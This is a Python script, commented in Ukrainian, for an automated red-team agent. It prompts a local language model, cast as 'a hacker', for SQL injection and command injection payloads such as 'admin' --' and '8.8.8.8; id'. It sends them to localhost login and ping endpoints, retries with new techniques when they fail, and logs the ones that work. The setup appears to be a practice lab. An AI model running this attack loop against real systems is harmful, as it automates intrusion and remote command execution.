import requests
import json
import random
import time
import re

class RedTeamAgent:
    def __init__(self, ollama_url="http://localhost:11434/api/generate", model="dolphin-llama3"):
        self.ollama = ollama_url
        self.model = model
        self.history_file = "agents/attack_history.json"
        
        # Наші цілі (Endpoints)
        self.targets = {
            "SQLi": {
                "url": "http://localhost:5000/login_check",
                "param": "username",
                "success_indicator": "Welcome, admin",
                # Промпт: Кажемо обгорнути в <<< >>>
                "base_prompt": "You are a hacker. Target: SQLite Login. Goal: Bypass password. Write ONLY the injection payload. Wrap the payload in triple angle brackets like this: <<<admin' -->>>."
            },
            "RCE": {
                "url": "http://localhost:5000/admin/ping",
                "param": "ip",
                "success_indicator": "uid=",
                # Промпт: Кажемо обгорнути в <<< >>>
                "base_prompt": "You are a hacker. Target: Python os.popen(). Goal: Execute 'id'. Write ONLY the payload. Wrap the payload in triple angle brackets like this: <<<8.8.8.8; id>>>."
            }
        }

    def ask_ai(self, prompt, temperature=0.7):
        """Функція спілкування з Ollama"""
        data = {
            "model": self.model,
            "prompt": prompt,
            "stream": False,
            "options": {"temperature": temperature}
        }
        try:
            res = requests.post(self.ollama, json=data).json()
            raw_text = res['response']
            
            # 🔥 ФІЛЬТР БАЛАЧОК (Regex)
            # Шукаємо все, що всередині <<< ... >>>
            match = re.search(r'<<<(.*?)>>>', raw_text, re.DOTALL)
            
            if match:
                clean_payload = match.group(1).strip()
                return clean_payload
            else:
                # Якщо ШІ затупив і не поставив дужки, пробуємо взяти останній рядок коду
                # або просто повертаємо як є (але це ризик)
                print(f"   ⚠️ AI didn't use tags. Raw output: {raw_text[:50]}...")
                # Спробуємо почистити вручну:
                clean = raw_text.replace("Here is the payload:", "").replace("Payload:", "").strip()
                return clean.split('\n')[0] # Беремо тільки перший рядок

        except Exception as e:
            print(f"❌ AI Error: {e}")
            return None

    def attack(self, attack_type="RCE", max_retries=5):
        print(f"\n🤖 RED TEAM: Starting {attack_type} campaign...")
        
        target = self.targets[attack_type]
        previous_payload = ""
        
        for attempt in range(1, max_retries + 1):
            if attempt == 1:
                prompt = target["base_prompt"]
            else:
                prompt = f"""
                {target["base_prompt"]}
                PREVIOUS FAILED PAYLOAD: <<< {previous_payload} >>>
                INSTRUCTION: The previous payload failed. Try a DIFFERENT technique.
                Remember to wrap the new payload in <<< ... >>>
                """
            
            payload = self.ask_ai(prompt, temperature=0.8)
            if not payload: continue
            
            print(f"   🔸 Attempt {attempt}: Trying payload -> {payload}")
            
            try:
                # Для SQLi додаємо фіктивний пароль
                params = {target["param"]: payload}
                if attack_type == "SQLi": params["password"] = "123"
                
                response = requests.get(target["url"], params=params, timeout=5)
                
                # Перевірка успіху
                if target["success_indicator"] in response.text:
                    print(f"   🚩 PWNED! Successful {attack_type}!")
                    self.save_success(attack_type, payload)
                    return payload
                
                if attack_type == "RCE" and "root" in response.text:
                     print(f"   🚩 PWNED! Successful {attack_type} (Root found)!")
                     self.save_success(attack_type, payload)
                     return payload

            except Exception as e:
                print(f"   ⚠️ Request failed: {e}")
            
            previous_payload = payload
        
        print(f"   💀 Red Team failed to crack {attack_type} after {max_retries} attempts.")
        return None

    def save_success(self, attack_type, payload):
        entry = {"type": attack_type, "payload": payload, "timestamp": time.time()}
        try:
            with open(self.history_file, "r+") as f:
                try:
                    data = json.load(f)
                except:
                    data = []
                data.append(entry)
                f.seek(0)
                json.dump(data, f, indent=4)
        except:
            with open(self.history_file, "w") as f:
                json.dump([entry], f, indent=4)
